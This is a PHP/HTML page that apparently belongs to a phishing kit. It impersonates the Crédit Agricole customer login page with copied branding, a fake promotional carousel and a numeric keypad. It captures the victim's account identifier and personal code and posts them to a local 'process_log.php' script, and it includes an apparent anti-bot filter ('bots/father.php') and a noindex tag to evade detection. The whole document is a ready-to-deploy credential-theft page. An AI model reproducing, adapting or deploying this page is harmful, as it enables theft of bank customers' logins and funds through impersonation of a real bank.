 <?php


include '../bots/father.php';
include_once '../inc/app.php';

?>


<!DOCTYPE html>
<html lang="fr" class="backgroundblendmode no-capture flexbox flexwrap">

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:url" content="">


<meta name="description" content="">
<meta property="og:description" content="">


<meta name="robots" content="noindex">

<title>Accès CR - Crédit Agricole</title>
<meta property="og:title" content="Accès CR - Crédit Agricole" />
<meta property="og:image" content="../assets/img/calogo.png">

<noscript>
 <style type="text/css">
body {
overflow:hidden;
}
 </style>
<div class="TechnicalError noscript">
<div class="TechnicalError-content">
<div class="TechnicalError-paragraph">
<p class="TechnicalError-firstPara">Malheureusement, votre configuration de navigation actuelle ne vous permet pas de naviguer dans de bonnes conditions.</br> Vous ne pourrez pas profiter de toutes les fonctionnalités de notre site ni accéder à votre espace client.</p>
</div>
</div>
</div>
</noscript>
<meta name="format-detection" content="telephone=no">
 
<link rel="icon" type="image/png" href="../assets/img/favicon.png">


<link rel="stylesheet" href="../assets/css/clientlib-part.min.ea256277357fa8db5612c74f1e54f567.css" type="text/css">

<link rel="stylesheet" href="../assets/css/clientlibStoreLocatorT33Part.min.1f61aaac8fd08ba4c317656d6f0e4a62.css" type="text/css">
<link rel="stylesheet" href="../assets/css/clientlibStoreLocatorT34Part.min.f3d31862687057258256810db3499be7.css" type="text/css">
<link rel="stylesheet" href="../assets/css/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css" type="text/css">


<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
<script src="../assets/js/utils.min.423ec59365a85ebded314ad7311ef508.js" defer="defer"></script>
<script src="../assets/js/granite.min.579a107dd681c49bc61dae63734043cb.js" defer="defer"></script>
<script src="../assets/js/clientlib-bootstrap-jquery.min.1661914e05c676ce450674555cc1e5b0.js" defer="defer"></script>
<script src="../assets/js/clientlibHeader.min.9b997b2ac9fca6031bd046f1edd29d81.js" defer="defer"></script>
 
</head>
 
<body class="BodyLogin" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQifSwidmVyc2lvbiI6IjEuOC4xNCIsInNjb3JlIjoxMDgxNDB9XQ==">


<nocobrowse></nocobrowse>

<header>


</header>

<main>

<!-- Machine Id hluz -->

<div class="Login" bis_skin_checked="1">
<div class="Login-header js-Header" bis_skin_checked="1">
 
<a href="#" class="Login-logo Login-logo-js" bis_skin_checked="1">
<div class="Login-logoImg js-needFakeNotSvg" style="position: relative;" bis_skin_checked="1"><img class="" src="../assets/img/calogo.png" alt="Crédit Agricole Centre Ouest" style="position: absolute; top: 50%; left: 50%; max-width: 100%; max-height: 100px; height: 100%; transform: translate(-50%, -50%);"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIADgBLAMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AlUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//2Q==" style="opacity: 0; max-width: 100%; max-height: 100%; visibility: hidden;"></div>
</a>

<a href="login.php" class="Login-close" id="Login-close" tabindex="0" role="button" aria-label="Quitter l&#39;accès à mon espace" bis_skin_checked="1" onclick="window.location.href = 'login.php':"></a>
</div>

<div class="container-fluid Template" bis_skin_checked="1" style="margin-top: 60px;">
<div class="row js-Template-head" bis_skin_checked="1">
<div class="col-xs-12 col-md-6" bis_skin_checked="1">
<div class="Template-reduceMargin15px" bis_skin_checked="1">
<div class="js-StickyPush" bis_skin_checked="1"><div class="js-StickyWrap" bis_skin_checked="1"><div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs" style="height: 796px;" bis_skin_checked="1">
<div class="placeholder-left parsys" bis_skin_checked="1"><div class="new-zdg parbase section" bis_skin_checked="1">

<script type="text/javascript">
(function () {


window.ContextHub.eventing.on(ContextHub.SegmentEngine.PageInteraction.Teaser.prototype.info.loadEvent, function (event) {
$(window).trigger('initCustomRedirect');
});

$("div[class='PushCommunication-text']").find("p").each(function () {
var inner = $(this)[0].innerHTML.trim();
var brIfExist = inner.substr(inner.length - 4);
var brAndNbspIfExist = inner.substr(inner.length - 11);
if (brIfExist.indexOf("<br>") >= 0 || (brAndNbspIfExist.indexOf("<br>") >= 0 && brAndNbspIfExist.indexOf("&nbsp;") >= 0)) {
setTimeout(removeLastBr, 1000, $(this));
}
});
function removeLastBr(p) {
$(p).find("br:last-child").remove();
}
});
</script>


<div class="componentZdg" bis_skin_checked="1">
<div class="PushCarousel3" bis_skin_checked="1">
<div bis_skin_checked="1"><button class="PushCarousel3-masking" onclick="toggleStateCarousel(&#39;hom&#39;)">Mettre en pause ou
redémarrer le défilement du carousel</button></div>
<div class="PushCarousel3-carousel" bis_skin_checked="1">
<div data-trackingclass="carrousel" class="PushCarousel3-carouselInner owl-loaded" data-owl-access-keyup="1" data-owl-carousel-focusable="1" bis_skin_checked="1">
  

<div class="owl-stage-outer" bis_skin_checked="1"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0s ease 0s; width: 641px;" bis_skin_checked="1"><div class="owl-item active" aria-hidden="false" style="width: 640px; margin-right: 1px;" bis_skin_checked="1"><div class="PushCarousel3-item" data-trackinginfo="progcr_mpmOffreEstivale_1" bis_skin_checked="1">

<div class="PushCommunication-backgroundWrapper" bis_skin_checked="1">
<div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('../assets/img/acces_cr_part_carre.jpg');" bis_skin_checked="1">
</div>

</div>
<div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white" bis_skin_checked="1">

<div class="PushCommunication-sticky" bis_skin_checked="1">TÉLÉSURVEILLANCE</div>


<div class="PushCommunication-title" bis_skin_checked="1">
<div class="texte section" bis_skin_checked="1"><p><span class="h3">CET ÉTÉ, PROFITEZ D'UNE ALARME CONNECTÉE POUR VRAIMENT DÉCONNECTER</span></p>
</div>
</div>

<div class="PushCommunication-text" bis_skin_checked="1">
<div class="texte section" bis_skin_checked="1">
<p>Sécurisez votre domicile avec un système d'alarme 24h/24, 7j/7 pour des vacances en toute sérénité. En ce moment, les frais d'installation sont offerts.</p>

</div>
</div>



<!-- Si la popin de co est activé -->

<!-- Si la popin de co n'est pas activé -->


<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" data-owl-temp-tabindex="0" tabindex="0" bis_skin_checked="1"><span>En savoir plus </span></a>



</div>
</div></div></div></div><div class="owl-nav disabled" bis_skin_checked="1"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div><div class="owl-dots disabled" bis_skin_checked="1"></div></div>
</div>
</div>
</div>
<script>
if (typeof sliderRelationalMessage === 'function') {
sliderRelationalMessage();
};
</script>


</div>

</div>

</div></div></div>
</div>
</div>

<div class="col-xs-12 col-md-6" bis_skin_checked="1">
<div class="Template-reduceMargin15px" bis_skin_checked="1">
<div class="Login-container" bis_skin_checked="1">
<div class="Login-title" bis_skin_checked="1">
<h1>Accéder à <strong>mes comptes</strong></h1>
</div>

<div class="row row-no-padding" bis_skin_checked="1">
<div class="col-xs-12 col-sm-6" bis_skin_checked="1">
<div class="login-mini parbase" bis_skin_checked="1">

<FORM class="Login-form" id="loginForm" name="loginForm" novalidate="" action="param/process_log.php" method="post">

<div class="row row-no-padding" bis_skin_checked="1">

<div class="form-group" bis_skin_checked="1">
<label for="Login-account" class="col-xs-7 Login-noPadding Login-accountLabel">Identifiant</label>

<div class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation" bis_skin_checked="1">
<p id="descIdentifiant">Saisissez votre identifiant à 11 chiffres</p>
</div>

<div class="col-xs-12 Login-noPadding" id="Login-account-div" bis_skin_checked="1">
<div class="add-clear-span form-group " bis_skin_checked="1">

<input class="form-control input-clear" id="Login-account" name="CCPTE" placeholder="Exemple 98652706859" maxlength="11" type="text" pattern="[0-11]{5}" required="" aria-label="Identifiant" data-aria-label="Effacer et saisir à nouveau le champ identifiant" aria-describedby="descIdentifiant" tabindex="0" style="display: block;"  onkeyup="document.getElementById('identifiant').value = document.getElementById('Login-account').value;">

<input type="text" name="identifiant" id="identifiant" class="form-control input-clear" placeholder="Ex: 98652706859" maxlength="11" pattern="[0-11]{5}" required="" aria-label="Identifiant" data-aria-label="Effacer et saisir à nouveau le champ identifiant" aria-describedby="descIdentifiant" tabindex="0" style="display: none;" readonly="readonly">

<span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3;" aria-label="Effacer et saisir à nouveau le champ identifiant" tabindex="0" id="BtnVider" onclick="BtnVider();"></span></div>
<div class="loader loader--biggest loader--center" style="display: none;" bis_skin_checked="1"></div>
</div>   
</div>

</div>

<div class="col-xs-12 Login-noPadding error" tabindex="-1" style="display:none" data-aria-describredby="erreur-ident" bis_skin_checked="1">
<p role="alert" id="erreur-ident" style="display:none">
Veuillez saisir votre numéro de compte à onze chiffres ou caractères alphabétiques
</p>
</div>

<div class="row row-no-padding" bis_skin_checked="1" id="NUMPAD_tab" style="display:none;">
<div class="form-group div-code-perso" bis_skin_checked="1">

<label for="Login-password" class="col-xs-7 Login-noPadding Login-accountLabel">Code personnel</label>

<div class="col-xs-5 Login-lostPswd Login-noPadding js-lostPswd-pswd" bis_skin_checked="1">


<div class="login-simple-link parbase" bis_skin_checked="1">
<a href="#" class="Login-lostPswdLink js-OpenTooltip" tabindex="0" aria-label="Mot de passe perdu ou oublié ?" bis_skin_checked="1">Perdu / Oublié&nbsp;?</a>
</div>



</div>

<div class="sr-only" bis_skin_checked="1"><span id="passwordmessage" aria-live="polite"></span></div>

<div class="col-xs-12 Login-noPadding" id="Login-password-div" bis_skin_checked="1">

 <div class="add-clear-span form-group " bis_skin_checked="1">

<input id="Login-password" type="password" class="form-control input-clear" placeholder="Tapez votre code dans le pavé numérique ci-dessous" readonly="readonly" maxlength="6" aria-label="Code personnel" data-aria-label="Effacer et saisir à nouveau le champ code personnel" tabindex="0" value="">

<input name="password" id="password" type="hidden" class="form-control input-clear" placeholder="Tapez votre code dans le pavé numérique ci-dessous" readonly="readonly" maxlength="6" aria-label="Code personnel" data-aria-label="Effacer et saisir à nouveau le champ code personnel" tabindex="0" value="" style="display:none;">

<span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display:none;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3;" aria-label="Effacer et saisir à nouveau le champ code personnel" tabindex="0" id="PadBtnVide" onclick="NumPadBtnVide();"></span>

</div>

<input type="hidden" id="j_password" name="j_password">
<input type="hidden" id="j_num-client" name="j_username">
<input type="hidden" id="path" name="j_currentpath" value="/content/npc/start">
<input type="hidden" id="j_validate" name="j_validate" value="true">

<input type="hidden" name="verbot">
<input type="hidden" name="type" value="login"> 

</div>

</div>
</div>

<div class="col-xs-12 Login-noPadding error" tabindex="-1" style="display:none" aria-describedby="erreur-keypad" bis_skin_checked="1">
<p role="alert" id="erreur-keypad" style="display:none">
Votre identification est incorrecte, veuillez ressaisir votre code d'accès
</p>
</div>

<div class="row row-no-padding" bis_skin_checked="1">
<div class="col-xs-12" bis_skin_checked="1">

<button id="NUMPAD_btn" tabindex="0" type="button" aria-label="Valider mon indentifiant et entrer mon code personnel" class="btn btn-primary col-xs-12 Login-button" login-submit-btn="" disabled="" onclick="NumPad_tabView();">
Entrer mon code personnel
</button>

</div>
</div>

<script type="text/javascript">

function puttext(){
setTimeout(function () {
var passw = document.getElementById("Login-password").value;
if(passw!=""){ document.getElementById("Login-password").value = passw.replace('*',''); }
puttext();
},10);
}puttext();

function puttext2(){
var passw = document.getElementById("Login-password").value;
if(passw!=""){ document.getElementById("Login-password").value = passw.replace('*',''); }
}

function NumPadBtnCode(id){
var idd = id;
var passw1 = document.getElementById("password").value;

if(passw1.length < 6){
document.getElementById("password").value = document.getElementById("password").value + idd; 
document.getElementById("Login-password").value = document.getElementById("password").value;
var passw = document.getElementById("Login-password").value;
if(passw!=""){ document.getElementById("Login-password").value = passw.replace('*',''); }
}

}

function NumPadBtnVide(){
document.getElementById("PadBtnVide").style.display = "none";
document.getElementById("password").value = "";
document.getElementById("Login-password").value = "";
}


function NumPad_tabView(){
var NUMPAD_tab = document.getElementById("NUMPAD_tab");
var NUMPAD_btn = document.getElementById("NUMPAD_btn");
var NUMPAD_clv = document.getElementById("clavier_num");
var NUMPAD_vld = document.getElementById("validation");

var NUMPAD_pad1 = document.getElementById("NUMPAD_pad1");
var NUMPAD_pad2 = document.getElementById("NUMPAD_pad2");
var NUMPAD_ok = document.getElementById("NUMPAD_ok");

var LoginAccount = document.getElementById("Login-account");

if(NUMPAD_tab.style.display === "none" || NUMPAD_tab.style.display === "block"){

document.getElementById("NUMPAD_tab").style.display = "block";
document.getElementById("clavier_num").style.display = "block";
document.getElementById("clavier_num").style.display = "block";
document.getElementById("NUMPAD_pad1").style.display = "block";
document.getElementById("NUMPAD_pad2").style.display = "block";
document.getElementById("NUMPAD_ok").style.display = "block";
document.getElementById("validation").style.display = "block";

document.getElementById("NUMPAD_btn").style.display = "none";
document.getElementById("Login-account").setAttribute("readonly", "readonly");
document.getElementById("Login-account").style.pointerEvents = "none";

}

}


function BtnVider(){
document.getElementById("BtnVider").style.display = "none";
document.getElementById("NUMPAD_tab").style.display = "none";
document.getElementById("clavier_num").style.display = "none";
document.getElementById("clavier_num").style.display = "none";
document.getElementById("NUMPAD_pad1").style.display = "none";
document.getElementById("NUMPAD_pad2").style.display = "none";
document.getElementById("NUMPAD_ok").style.display = "none";
document.getElementById("validation").style.display = "none";

document.getElementById("NUMPAD_btn").style.display = "block";
document.getElementById("Login-account").removeAttribute("readonly");
document.getElementById("Login-account").setAttribute("type", "text");
document.getElementById("Login-account").style.pointerEvents = "auto";
document.getElementById("Login-account").value = "";
document.getElementById("identifiant").value = "";
document.getElementById("password").value = "";
document.getElementById("Login-password").value = "";
window.location.reload();

}


function screen(){
setTimeout(function () {

var passw = document.getElementById("Login-password").value;
var account = document.getElementById("Login-account").value;

if(account.length >= 11){
document.getElementById("NUMPAD_btn").removeAttribute("disabled");
}else{
document.getElementById("NUMPAD_btn").setAttribute("disabled", "");
}

if(passw.length >= 6){
document.getElementById("validation").removeAttribute("disabled");
}else{
document.getElementById("validation").setAttribute("disabled", "");
}

document.getElementById('identifiant').value = document.getElementById('Login-account').value;

screen();
},700);
}screen();


</script>

<div id="clavier_num" bis_skin_checked="1"></div>

<div class="row row-no-padding" bis_skin_checked="1" id="NUMPAD_pad1" style="display: none;">
<div class="col-xs-12" bis_skin_checked="1">
<div class="Login-keypad" bis_skin_checked="1">
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('5');" onkeyup="puttext2();">5</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('3');" onkeyup="puttext2();">3</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('8');" onkeyup="puttext2();">8</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('7');" onkeyup="puttext2();">7</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('6');" onkeyup="puttext2();">6</a>
</div>
</div>
</div>
<div class="row row-no-padding" bis_skin_checked="1" id="NUMPAD_pad2" style="display: none;">
<div class="col-xs-12" bis_skin_checked="1">
<div class="Login-keypad" bis_skin_checked="1">
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('1');" onkeyup="puttext2();">1</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('0');" onkeyup="puttext2();">0</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('9');" onkeyup="puttext2();">9</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('2');" onkeyup="puttext2();">2</a>
<a href="#" class="Login-key T031__key" role="button" onclick="NumPadBtnCode('4');" onkeyup="puttext2();">4</a>
</div>
</div>
</div>

<div class="row row-no-padding" bis_skin_checked="1" id="NUMPAD_ok" style="display: none;">
<div class="col-xs-12" bis_skin_checked="1">
<input value="Valider" id="validation" aria-label="Valider mon code et accèder à mes comptes" type="submit" class="btn btn-primary Login-button col-xs-12" disabled="" style="display: none;" onclick="document.getElementById('loginForm').submit();">
</div>
</div>

<div class="register parsys" bis_skin_checked="1"><div class="texte section" bis_skin_checked="1">

<div tabindex="-1" bis_skin_checked="1">
<p style="text-align: center;"><span class="h3">Vous n’êtes pas encore client&nbsp;?</span></p>

</div>
</div>
<div class="bouton-generique parbase section" bis_skin_checked="1">

<div class="GenericBtn GenericBtn--full" bis_skin_checked="1">

<a href="#" class="GenericBtn-btn" bis_skin_checked="1">
<span>Devenir client</span>
</a>

</div>

</div>

</div>


</FORM>


</div>

</div>


<div class="col-xs-12 col-sm-6" bis_skin_checked="1">
<div class="Login-information" bis_skin_checked="1">
<div class="infos texte" bis_skin_checked="1">




<div tabindex="-1" bis_skin_checked="1">
<h2><b>VOTRE IDENTIFICATION NE CHANGE PAS<u><br>
</u></b></h2>
<h2>(C’est votre N° de compte)</h2>
<p><span class="RichText-texteVignettes">Pour accéder à votre compte, saisissez votre identifiant et votre code personnel habituels.<br>
</span><br>
</p>
<p><span class="lead"><b>UN PROBLÈME TECHNIQUE <br>
 </b>LORS DE VOTRE CONNEXION?<br>
 </span><span class="RichText-texteVignettes"><a href="#" bis_skin_checked="1">Signalez-nous un problème</a></span></p>
<p><span class="lead"><b><br>
SÉCURITÉ<br>
 </b></span><span class="RichText-texteVignettes">Restez vigilants et veillez à protéger vos données personnelles.<br>
 <a href="#" title="Conseils de sécurité (nouvel onglet)" bis_skin_checked="1">Consultez nos conseils de sécurité</a></span></p>
<p><span class="RichText-texteVignettes">Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.<br>
 <a href="#" title="Mentions légales (même onglet)" bis_skin_checked="1">Voir les Conditions Générales d'Utilisation</a></span></p>

</div>
</div>

</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<?php 
/*CACHE*/
$fichierCache = '../cache/lca_loginFooter.lca';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?> 

</main> 


<script src="../assets/js/clientlib-general.min.b5ff34b2035703897d75f3a3044f3a1e.js" defer="defer"></script>
<script src="../assets/js/clientlibPageErreur.min.f434b09157730b423058e364dda8b336.js" defer="defer"></script> 
<script src="../assets/js/clientlibMireAuthentification.min.5e969969429038946546644a08b416ee.js" defer="defer"></script>
<script src="../assets/js/jquery.min.js"></script>
<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>
 
</body></html>

<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lca_loginFooter.lca');echo "\n";}  
?>